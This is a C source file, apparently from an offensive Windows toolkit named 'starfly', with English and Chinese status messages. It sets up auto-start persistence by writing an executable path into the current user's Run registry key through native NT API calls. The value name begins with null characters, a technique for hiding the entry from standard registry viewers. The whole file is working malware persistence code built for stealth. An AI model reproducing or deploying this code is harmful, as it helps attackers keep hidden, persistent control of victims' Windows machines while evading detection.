#include <windows.h>
#include "starfly.h"
#include "nt.h"
#include <stdio.h>
#include <stdlib.h>

void SFSetStartup(char* exePath) {
    HANDLE hToken;
    SFPrintStatus("Resolving Current User's Sid.", "正在解析当前用户Sid");
    status = SFNtOpenProcessToken(GetCurrentProcess(), MAXIMUM_ALLOWED, &hToken);
    ULONG returnLength;
    PTOKEN_USER cTokenUser;
    status = SFNtQueryInformationToken(hToken, TokenUser, NULL, 0, &returnLength);
    cTokenUser = (PTOKEN_USER)malloc(returnLength);
    status = SFNtQueryInformationToken(hToken, TokenUser, cTokenUser, returnLength, &returnLength);
    LPWSTR sidString = NULL;
    ConvertSidToStringSidW(cTokenUser->User.Sid, &sidString);
    wchar_t keyPathBuffer[512];
    swprintf(keyPathBuffer, 512, L"\\Registry\\User\\%s\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", sidString);
    UNICODE_STRING keyPath;
    RtlInitUnicodeString(&keyPath, keyPathBuffer);
    UNICODE_STRING valueName;
    RtlInitUnicodeString(&valueName, L"\0\0SFStartup");
    wchar_t* programPath = NULL;
    size_t programPathSize = strlen(exePath) + 1;
    programPath = (wchar_t*)malloc(programPathSize * sizeof(wchar_t));
    size_t convertedChars = 0;
    mbstowcs_s(&convertedChars, programPath, programPathSize, exePath, programPathSize - 1);
    OBJECT_ATTRIBUTES objectAttributes;
    InitializeObjectAttributes(&objectAttributes, &keyPath, OBJ_CASE_INSENSITIVE, NULL, NULL);
    HANDLE keyHandle;
    SFPrintStatus("Opening Key", "正在打开键值");
    status = SFNtOpenKey(&keyHandle, KEY_ALL_ACCESS, &objectAttributes);
    if (keyHandle == 0) {
        SFPrintError("Failed to Open Key.", "打开键值失败");
        return;
    } else {
    o_mode = 5;
    SFPrintSuccess("Successfully Set Auto Startup.", "成功设置开机自启动");
    status = SFNtSetValueKey(keyHandle, &valueName, 0, REG_SZ, (PVOID)programPath, programPathSize * sizeof(wchar_t));
    }
}